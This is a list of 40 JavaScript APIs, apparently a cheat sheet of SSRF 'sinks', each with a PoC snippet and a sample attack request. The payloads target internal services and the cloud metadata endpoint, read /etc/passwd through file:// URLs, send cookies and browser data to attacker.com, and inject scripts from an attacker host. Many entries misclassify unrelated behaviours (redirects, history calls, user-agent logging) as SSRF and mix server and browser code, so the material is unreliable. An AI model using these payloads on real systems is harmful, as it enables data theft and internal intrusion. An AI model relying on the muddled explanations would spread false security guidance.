### 1. **`fetch()`**
- **Potential**: If the URL is controlled by the user, it can point to internal services.
- **PoC**:
  ```javascript
  fetch(req.query.url); // Attacker can pass an internal URL
  ```
- **Request Example**:
  ```
  GET /fetch?url=http://internal-service.local/data
  ```

### 2. **`axios.get()`**
- **Potential**: Vulnerable to SSRF if the URL in the request body is not validated.
- **PoC**:
  ```javascript
  axios.get(req.body.url); // User-controlled URL
  ```
- **Request Example**:
  ```
  POST /api/getData
  Content-Type: application/json

  {
      "url": "http://internal-api.local/resource"
  }
  ```

### 3. **`http.get()`**
- **Potential**: Using user-supplied data can lead to internal resource access.
- **PoC**:
  ```javascript
  http.get(req.query.url); // Potentially unsafe URL
  ```
- **Request Example**:
  ```
  GET /proxy?url=http://169.254.169.254/latest/meta-data/
  ```

### 4. **`request()`**
- **Potential**: SSRF risk if the URL is user-controlled.
- **PoC**:
  ```javascript
  request(req.query.url); // Fetching based on user input
  ```
- **Request Example**:
  ```
  GET /request?url=http://internal-service.local/private-data
  ```

### 5. **`document.location`**
- **Potential**: Redirecting to internal resources without validation.
- **PoC**:
  ```javascript
  document.location = req.query.url; // Redirecting user to internal URL
  ```
- **Request Example**:
  ```
  GET /redirect?url=http://internal-service.local/api
  ```

### 6. **`window.location`**
- **Potential**: Can be exploited to redirect users to internal services.
- **PoC**:
  ```javascript
  window.location.href = req.body.url; // Unsafe redirect
  ```
- **Request Example**:
  ```
  POST /redirect
  Content-Type: application/json

  {
      "url": "http://internal-service.local/api"
  }
  ```

### 7. **`XMLHttpRequest`**
- **Potential**: Making unauthorized requests to internal APIs.
- **PoC**:
  ```javascript
  const xhr = new XMLHttpRequest();
  xhr.open('GET', req.query.url);
  xhr.send(); // Sending request to an internal API
  ```
- **Request Example**:
  ```
  GET /xmlhttp?url=http://internal-api.local/resource
  ```

### 8. **`WebSocket`**
- **Potential**: Attacker can open a WebSocket connection to internal services.
- **PoC**:
  ```javascript
  const socket = new WebSocket(req.query.url); // Attacking internal services
  ```
- **Request Example**:
  ```
  GET /ws?url=ws://internal-service.local/socket
  ```

### 9. **`eval()`**
- **Potential**: Executing arbitrary code can lead to SSRF.
- **PoC**:
  ```javascript
  eval(`fetch('${req.body.url}')`); // Dangerous execution
  ```
- **Request Example**:
  ```
  POST /eval
  Content-Type: application/json

  {
      "url": "http://internal-service.local/data"
  }
  ```

### 10. **`fetch('file://...')`**
- **Potential**: Accessing local files through crafted URLs.
- **PoC**:
  ```javascript
  fetch(`file://${req.query.path}`); // Accessing sensitive local files
  ```
- **Request Example**:
  ```
  GET /file?path=/etc/passwd
  ```

### 11. **`document.referrer`**
- **Potential**: Attacker can manipulate referrer for unauthorized access.
- **PoC**:
  ```javascript
  fetch(`http://internal-service.local/data?referrer=${document.referrer}`); // Referrer manipulation
  ```
- **Request Example**:
  ```
  GET /fetch?referrer=http://internal-service.local
  ```

### 12. **`document.cookie`**
- **Potential**: Sending cookies to an attacker’s server.
- **PoC**:
  ```javascript
  fetch(`http://attacker.com/steal-cookies?cookies=${document.cookie}`); // Exposing cookies
  ```
- **Request Example**:
  ```
  GET /steal-cookies?cookies=<cookie_value>
  ```

### 13. **`localStorage`**
- **Potential**: Using data stored in local storage for internal requests.
- **PoC**:
  ```javascript
  const apiUrl = localStorage.getItem('apiUrl');
  fetch(apiUrl); // Using stored URL
  ```
- **Request Example**:
  ```
  GET /fetch?url=http://internal-service.local/data
  ```

### 14. **`sessionStorage`**
- **Potential**: Accessing session data for unauthorized requests.
- **PoC**:
  ```javascript
  const path = sessionStorage.getItem('filePath');
  fetch(`file://${path}`); // Accessing local files
  ```
- **Request Example**:
  ```
  GET /file?path=/etc/passwd
  ```

### 15. **`history.pushState()`**
- **Potential**: Redirecting to internal URLs using history state manipulation.
- **PoC**:
  ```javascript
  history.pushState({}, 'New State', req.query.url); // Unsafe history manipulation
  ```
- **Request Example**:
  ```
  GET /history?url=http://internal-service.local/api
  ```

### 16. **`history.replaceState()`**
- **Potential**: Replacing history state with internal URLs.
- **PoC**:
  ```javascript
  history.replaceState({}, 'Replaced State', req.body.url); // Unsafe replace
  ```
- **Request Example**:
  ```
  POST /replace-state
  Content-Type: application/json

  {
      "url": "http://internal-api.local/resource"
  }
  ```

### 17. **`document.baseURI`**
- **Potential**: Using base URI for requests to internal services.
- **PoC**:
  ```javascript
  fetch(`${document.baseURI}/internal-service/api`); // Using base URI for internal access
  ```
- **Request Example**:
  ```
  GET /base-uri?url=http://internal-service.local/api
  ```

### 18. **`navigator` Object**
- **Potential**: Using navigator data to exploit requests.
- **PoC**:
  ```javascript
  const userAgent = navigator.userAgent;
  fetch(`http://attacker.com/log?agent=${userAgent}`); // Logging user agent
  ```
- **Request Example**:
  ```
  GET /log?agent=<user_agent>
  ```

### 19. **`setTimeout()`**
- **Potential**: Delayed requests can bypass security checks.
- **PoC**:
  ```javascript
  setTimeout(() => fetch(req.body.url), 5000); // Delayed execution
  ```
- **Request Example**:
  ```
  POST /timeout
  Content-Type: application/json

  {
      "url": "http://internal-service.local/data"
  }
  ```

### 20. **`setInterval()`**
- **Potential**: Continuous requests to internal APIs.
- **PoC**:
  ```javascript
  setInterval(() => fetch(req.body.url), 10000); // Regularly accessing internal data
  ```
- **Request Example**:
  ```
  POST /interval
  Content-Type: application/json

  {
      "url": "http://internal-api.local/resource"
  }
  ```

### 21. **`document.createElement()`**
- **Potential**: Injecting malicious scripts from unvalidated sources.
- **PoC**:
  ```javascript
  const script = document.createElement('script');
  script.src = req.query.url; // Loading script from user input
  document.body.appendChild(script);
  ```
- **Request Example**:
  ```
  GET /inject?url=http://attacker.com/malicious.js
  ```

### 22. **`iframe.src`**
- **Potential**: Loading sensitive internal pages through iframes.
- **PoC**:
  ```javascript
  const iframe = document.createElement('iframe');
  iframe.src = req.query.url; // Accessing internal page
  document.body.appendChild(iframe);
  ```
- **Request Example**:
  ```
  GET /iframe?url=http://internal-service.local/private
  ```

### 23. **`fetch(new Request())`**
- **Potential**: Constructing requests from user-controlled data.
- **PoC**:
  ```javascript
  const request = new Request(req.body.url);
  fetch(request); // Making an unsafe request
  ```
- **Request Example**:
  ```
  POST /request
  Content-Type: application/json

  {
      "url": "http://internal-service.local/data"
  }
  ```



### 24. **`Response.redirect()`**
- **Potential**: Redirecting to user-controlled URLs can expose internal resources.
- **PoC**:
  ```javascript
  response.redirect(req.query.url); // Unsafe redirect
  ```
- **Request Example**:
  ```
  GET /redirect?url=http://internal-api.local/resource
  ```

### 25. **`navigator.geolocation.getCurrentPosition()`**
- **Potential**: Using geolocation to craft requests based on location.
- **PoC**:
  ```javascript
  navigator.geolocation.getCurrentPosition(pos => {
      fetch(`http://example.com/api?lat=${pos.coords.latitude}&lng=${pos.coords.longitude}`);
  });
  ```
- **Request Example**:
  ```
  GET /geo?lat=<latitude>&lng=<longitude>
  ```

### 26. **`document.write()`**
- **Potential**: Writing unvalidated input can lead to SSRF.
- **PoC**:
  ```javascript
  document.write(`<script src="${req.query.url}"></script>`); // Injecting script
  ```
- **Request Example**:
  ```
  GET /write?url=http://attacker.com/malicious.js
  ```

### 27. **`navigator.sendBeacon()`**
- **Potential**: Attacker can send sensitive data to their server.
- **PoC**:
  ```javascript
  navigator.sendBeacon(req.body.url, data); // Sending data to attacker
  ```
- **Request Example**:
  ```
  POST /beacon
  Content-Type: application/json

  {
      "url": "http://attacker.com/log",
      "data": "sensitive information"
  }
  ```

### 28. **`window.open()`**
- **Potential**: Opening a window to internal services based on user input.
- **PoC**:
  ```javascript
  window.open(req.query.url); // Opening internal service
  ```
- **Request Example**:
  ```
  GET /open?url=http://internal-service.local/api
  ```

### 29. **`location.href`**
- **Potential**: Redirecting users to internal services without validation.
- **PoC**:
  ```javascript
  location.href = req.body.url; // Unsafe redirect
  ```
- **Request Example**:
  ```
  POST /navigate
  Content-Type: application/json

  {
      "url": "http://internal-service.local/resource"
  }
  ```

### 30. **`history.go()`**
- **Potential**: Navigating to an internal resource based on user input.
- **PoC**:
  ```javascript
  history.go(req.query.steps); // Moving history based on input
  ```
- **Request Example**:
  ```
  GET /history?steps=2 // User input can redirect to internal pages
  ```

### 31. **`document.getElementsByTagName()`**
- **Potential**: Manipulating DOM to create SSRF risks.
- **PoC**:
  ```javascript
  const element = document.getElementsByTagName('script')[0];
  fetch(element.src); // Fetching scripts
  ```
- **Request Example**:
  ```
  GET /fetch?url=http://internal-service.local/script.js
  ```

### 32. **`navigator.appVersion`**
- **Potential**: Using browser information to send to an external server.
- **PoC**:
  ```javascript
  fetch(`http://attacker.com/log?version=${navigator.appVersion}`); // Logging app version
  ```
- **Request Example**:
  ```
  GET /log?version=<app_version>
  ```

### 33. **`location.hostname`**
- **Potential**: Constructing internal URLs based on hostname.
- **PoC**:
  ```javascript
  fetch(`http://${location.hostname}/api`); // Accessing internal API
  ```
- **Request Example**:
  ```
  GET /fetch?host=<hostname>
  ```

### 34. **`navigator.userAgent`**
- **Potential**: Sending user-agent information to an attacker.
- **PoC**:
  ```javascript
  fetch(`http://attacker.com/log?ua=${navigator.userAgent}`); // Logging user agent
  ```
- **Request Example**:
  ```
  GET /log?ua=<user_agent>
  ```

### 35. **`setImmediate()`**
- **Potential**: Making requests that could bypass security controls.
- **PoC**:
  ```javascript
  setImmediate(() => fetch(req.body.url)); // Unsafe request
  ```
- **Request Example**:
  ```
  POST /immediate
  Content-Type: application/json

  {
      "url": "http://internal-service.local/data"
  }
  ```

### 36. **`document.activeElement`**
- **Potential**: Using the currently focused element's value to make requests.
- **PoC**:
  ```javascript
  const value = document.activeElement.value;
  fetch(`http://internal-service.local/${value}`); // Accessing based on user input
  ```
- **Request Example**:
  ```
  GET /active-element?value=<input_value>
  ```

### 37. **`navigator.clipboard.readText()`**
- **Potential**: Reading clipboard content that might contain URLs to access.
- **PoC**:
  ```javascript
  navigator.clipboard.readText().then(clipText => {
      fetch(clipText); // Accessing clipboard text as URL
  });
  ```
- **Request Example**:
  ```
  GET /clipboard
  ```

### 38. **`document.onmousemove`**
- **Potential**: Using mouse movement to trigger SSRF requests.
- **PoC**:
  ```javascript
  document.onmousemove = function() {
      fetch(req.query.url); // Triggering request on mouse move
  };
  ```
- **Request Example**:
  ```
  GET /mousemove?url=http://internal-service.local/data
  ```

### 39. **`window.postMessage()`**
- **Potential**: Sending messages to internal windows or frames that can lead to SSRF.
- **PoC**:
  ```javascript
  window.postMessage(req.body.url, '*'); // Posting messages to internal resources
  ```
- **Request Example**:
  ```
  POST /post-message
  Content-Type: application/json

  {
      "url": "http://internal-service.local/api"
  }
  ```

### 40. **`fetch(new URL())`**
- **Potential**: Creating requests from user-provided URLs.
- **PoC**:
  ```javascript
  const url = new URL(req.body.url);
  fetch(url); // Unsafe URL creation
  ```
- **Request Example**:
  ```
  POST /url-fetch
  Content-Type: application/json

  {
      "url": "http://internal-service.local/data"
  }
  ```
